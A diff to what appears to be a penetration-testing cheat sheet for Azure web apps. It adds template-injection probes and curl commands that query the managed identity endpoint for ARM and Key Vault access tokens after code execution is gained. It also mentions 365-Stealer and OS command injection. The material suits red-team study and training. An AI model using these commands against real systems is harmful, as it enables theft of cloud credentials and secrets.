@@ -184,9 +184,13 @@ cd C:\xampp\htdocs\365-Stealer\
 - The way expression is evaluated means that, most probably, either PHP or Python is used for the web app. We may need to run some trial and error methods to find out the exact language and template framework. 
 - Use ```{{config.items()}}``` and see if it works.
 - Check if a managed identity is assigned (Check for the env variables IDENTITY_HEADER and IDENTITY_ENDPOINT)
-- If code execution is possible execute the following to get a access token for the managed identity:
+- If code execution is possible execute the following to get a ARM access token for the managed identity:
 ```
-curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER'
+curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
+```
+- Request keyvault Access token
+```
+curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
 ```
 
 ## OS Command injection
